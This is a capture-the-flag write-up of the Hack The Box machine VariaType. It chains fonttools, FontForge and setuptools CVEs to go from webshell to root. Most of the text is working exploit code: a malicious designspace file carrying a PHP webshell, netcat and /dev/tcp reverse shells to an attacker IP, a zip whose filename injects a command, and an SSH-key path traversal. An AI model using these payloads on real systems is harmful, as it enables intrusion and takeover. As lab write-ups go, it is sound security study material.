# VariaType: Hack The Box Writeup

**Machine:** VariaType  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

VariaType is a Linux machine built around font tooling and a multi-service web stack. The attack chain starts with vhost enumeration revealing an internal validation portal with an exposed `.git` repository, which leaks hardcoded credentials. A vulnerable version of the `fonttools` Python library (CVE-2025-66034) allows arbitrary file write via a malicious `.designspace` file, used to drop a PHP webshell into the portal's web directory and obtain a shell as `www-data`. Lateral movement to `steve` exploits CVE-2024-25081, a command injection vulnerability in FontForge triggered by a crafted zip file processed by a background pipeline script. Privilege escalation to root abuses a sudo-permitted Python script that uses a vulnerable version of `setuptools` (CVE-2025-47273), where URL-encoded path separators bypass filename sanitisation to write an SSH public key directly to `/root/.ssh/authorized_keys`.

**Key techniques:** Vhost enumeration · Git repository exposure · CVE-2025-66034 (fonttools arbitrary file write) · PHP webshell · CVE-2024-25081 (FontForge command injection) · CVE-2025-47273 (setuptools path traversal) · SSH key injection

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.11.86
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    nginx 1.22.1: redirects to http://variatype.htb/
```

Two services: SSH and a web server. Add the hostname to `/etc/hosts`:

```bash
sudo vi /etc/hosts
# Add: 10.129.11.86  variatype.htb
```

---

## Enumeration

### Directory Enumeration

```bash
gobuster dir -u http://variatype.htb \
  -w /usr/share/wordlists/wfuzz/general/common.txt
```

```
/services   (Status: 200)
```

Limited results: only the services page. The main application is a variable font generator at `/tools/variable-font-generator`, which accepts `.designspace` and `.ttf`/`.otf` file uploads.

### Vhost Enumeration

Directory enumeration alone is not enough. Always run vhost enumeration in parallel:

```bash
gobuster vhost -u http://variatype.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

```
portal.variatype.htb   Status: 200 [Size: 2494]
```

A second virtual host exists. Add it to `/etc/hosts`:

```bash
sudo vi /etc/hosts
# Add: 10.129.11.86  portal.variatype.htb
```

### Exposed Git Repository: portal.variatype.htb

Checking for a common misconfiguration:

```bash
curl -s http://portal.variatype.htb/.git/HEAD
# ref: refs/heads/master
```

The `.git` directory is publicly accessible. Dump the repository with `git-dumper`:

```bash
pip install git-dumper
git-dumper http://portal.variatype.htb/.git/ ./portal-repo/
```

Examining the commit history:

```bash
cd portal-repo
git log --oneline
# 753b5f5 fix: add gitbot user for automated validation pipeline
# 5030e79 feat: initial portal implementation

git log -p
```

The second commit reveals hardcoded credentials added for an automated pipeline:

```
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

**Credentials:** `gitbot` / `G1tB0t_Acc3ss_2025!`

### Portal Enumeration

Directory enumeration on the portal reveals its structure:

```bash
gobuster dir -u http://portal.variatype.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

```
/.git/HEAD      (Status: 200)
/auth.php       (Status: 200)
/dashboard.php  (Status: 302)
/download.php   (Status: 302)
/files          (Status: 301)
/index.php      (Status: 200)
/view.php       (Status: 302)
```

The `/files` directory is where the font generator stores its output. This is critical for understanding the write target later.

---

## Initial Access: CVE-2025-66034 (fonttools Arbitrary File Write)

### Understanding the Vulnerability

The main application uses `fonttools varLib` to process `.designspace` files. CVE-2025-66034 is an arbitrary file write vulnerability in fonttools affecting versions >= 4.33.0 and < 4.60.2.

The vulnerability has two components:

1. **Path traversal in the `filename` attribute**: the `<variable-font>` element's `filename` attribute controls where fonttools writes its output. This value is passed directly to `os.path.join()` without sanitisation, meaning an absolute path discards the intended output directory entirely
2. **Content injection via `<labelname>`**: the content of `<labelname>` elements is injected into the output file via CDATA sections, allowing arbitrary content to be written

Combined, an attacker controls both where a file is written and what it contains.

### Generating Compatible Source Fonts

The application validates that uploaded fonts are genuine TrueType files. Generate two compatible source fonts using fonttools directly:

```python
# setup.py
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    fb.save(filename)

create_source_font("source-light.ttf", weight=100)
create_source_font("source-regular.ttf", weight=400)
```

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install fonttools
python3 setup.py
```

### Crafting the Malicious Designspace

From portal enumeration, the web root is `/var/www/portal.variatype.htb/public/` and the files directory is `/var/www/portal.variatype.htb/public/files/`. The PHP webshell is injected via the CDATA `labelname` technique.

Two important notes:
- Use **absolute path** for the filename: relative path traversal fails because fonttools resolves paths from an unpredictable temp directory
- Use **double quotes** in `$_GET["cmd"]`: single quotes inside CDATA can cause XML parsing issues

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">Regular</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" 
      filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

### Uploading and Triggering

Upload via the font generator form at `http://variatype.htb/tools/variable-font-generator`:

```bash
curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@exploit.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" -D - 2>&1 | head -3
# HTTP/1.1 200 OK: write succeeded
```

Verify RCE:

```bash
curl -s 'http://portal.variatype.htb/files/shell.php?cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

Set up a listener:

```bash
nc -lvnp 4000
```

Trigger the reverse shell:

```bash
curl -s 'http://portal.variatype.htb/files/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.15.12+4000+>/tmp/f'
```

Stabilise the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Shell obtained as `www-data`.

---

## Lateral Movement: CVE-2024-25081 (FontForge Command Injection)

### Enumeration as www-data

```bash
find / -user steve -readable 2>/dev/null
# /opt/process_client_submissions.bak

cat /opt/process_client_submissions.bak
```

The script is a font processing pipeline that runs as `steve` and processes files dropped into `/var/www/portal.variatype.htb/public/files/`. The critical section:

```bash
if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
    font = fontforge.open('$file')
    ...
"
```

The `$file` variable is interpolated directly into a bash string. The script processes `.zip` files, and CVE-2024-25081 allows command injection via a crafted filename embedded inside a zip archive: when the zip is extracted, the malicious filename is passed to a shell context.

### Crafting the Exploit

Generate the reverse shell payload:

```bash
echo "bash -i >& /dev/tcp/10.10.15.12/5000 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMi81MDAwIDA+JjEK
```

Create the malicious zip with a command-injecting filename:

```python
# exploit.py
import zipfile
payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMi81MDAwIDA+JjEK"
exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf"
with zipfile.ZipFile('./exploit.zip', 'w') as zipf:
    zipf.writestr(exploit_filename, "dummy content")
print("exploit.zip created")
```

```bash
python3 exploit.py
```

### Delivery and Execution

Start a listener:

```bash
nc -lvnp 5000
```

Serve the zip from the attack machine:

```bash
python3 -m http.server 8000
```

Download it to the portal files directory on the target:

```bash
curl http://10.10.15.12:8000/exploit.zip \
  -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

Wait for the pipeline script to execute: it runs periodically as `steve` and processes all files in the directory including `.zip`. The listener catches the shell:

```
connect to [10.10.15.12] from (UNKNOWN) [10.129.11.86] 56252
steve@variatype:/tmp/ffarchive-...$
```

```bash
cat /home/steve/user.txt
# d19e7ecd6a567fa187e74016213c3e29
```

---

## Privilege Escalation: CVE-2025-47273 (setuptools Path Traversal)

### Sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

`steve` can run `install_validator.py` as root with any arguments. The script downloads a plugin from a URL using `setuptools.PackageIndex.download()`:

```python
from setuptools.package_index import PackageIndex
index = PackageIndex()
downloaded_path = index.download(plugin_url, PLUGIN_DIR)
```

### Understanding CVE-2025-47273

The vulnerability is in `setuptools.package_index._download_url()`. The filename for the downloaded file is derived from the URL path via `egg_info_for_url()`:

```python
base = urllib.parse.unquote(path.split('/')[-1])
```

The final path component is URL-decoded, then passed to:

```python
filename = os.path.join(tmpdir, name)
```

If `name` begins with `/` after URL-decoding, `os.path.join` discards `tmpdir` entirely and writes to the absolute path. The trick is to URL-encode the slashes in the target path so they survive as a single path component: `/root/.ssh/authorized_keys` becomes `%2Froot%2F.ssh%2Fauthorized_keys`.

Verified locally on the target:

```bash
python3 -c "
from setuptools.package_index import egg_info_for_url
url = 'http://10.10.15.12:8888/%2Froot%2F.ssh%2Fauthorized_keys#egg=keys-1.0'
print(egg_info_for_url(url))
"
# ('/root/.ssh/authorized_keys', 'egg=keys-1.0')

python3 -c "
import os
print(os.path.join('/opt/font-tools/validators', '/root/.ssh/authorized_keys'))
"
# /root/.ssh/authorized_keys
```

### Exploitation

Generate an SSH keypair on the attack machine:

```bash
ssh-keygen -t rsa -f /tmp/htb_key -N ""
cp /tmp/htb_key.pub authorized_keys
```

Serve it with a minimal HTTP server:

```python
# server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open("authorized_keys", "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, *args): pass

HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
```

```bash
python3 server.py
```

Trigger the exploit as `steve`:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.15.12:8888/%2Froot%2F.ssh%2Fauthorized_keys#egg=keys-1.0"
# Plugin installed at: /root/.ssh/authorized_keys
```

SSH in as root:

```bash
ssh -i /tmp/htb_key root@10.129.11.86
```

```bash
root@variatype:~# cat /root/root.txt
# 38b16cfc14afef0e046e20d9c1769429
```
---

<img width="1195" height="677" alt="Screenshot 2026-04-28 103930" src="https://github.com/user-attachments/assets/300aae57-710d-4e90-a822-18e559d97fbd" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Exposed `.git` repository | `portal.variatype.htb/.git/` | Source code and hardcoded credentials exposed |
| Hardcoded credentials in git history | `auth.php` commit diff | `gitbot` portal access |
| CVE-2025-66034: fonttools arbitrary file write | Font generator: `.designspace` processing | RCE as `www-data` via PHP webshell |
| CVE-2024-25081: FontForge command injection | Font pipeline script: zip filename handling | Lateral movement to `steve` |
| CVE-2025-47273: setuptools path traversal | `install_validator.py`: `PackageIndex.download()` | Root SSH key injection |

---

## Key Takeaways

- **Always enumerate vhosts alongside directories**: `portal.variatype.htb` was the entry point for the entire chain; missing it meant hammering the wrong surface. Vhost enumeration is not a fallback, it is standard recon
- **`.git` exposure is critical**: an accessible `.git` directory leaks full source history including credentials that were "fixed" in a later commit. The fix is irrelevant once the history is readable
- **Absolute paths beat relative traversal**: when exploiting arbitrary file write, guessing relative paths from an unknown working directory wastes time. If the web root path can be inferred (from error messages, app structure, or enumeration), use absolute paths directly
- **Read the vulnerable code**: when a CVE PoC doesn't work out of the box, reading the actual vulnerable function (`egg_info_for_url`, `_download_url`, `os.path.join`) shows exactly what the exploit needs. The URL-encoding bypass (`%2F`) was only apparent from reading the source
- **CVE chaining is the norm**: this machine chains three separate CVEs across different components. Real engagements often require the same: one vulnerability gets a foothold, another escalates, another roots

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
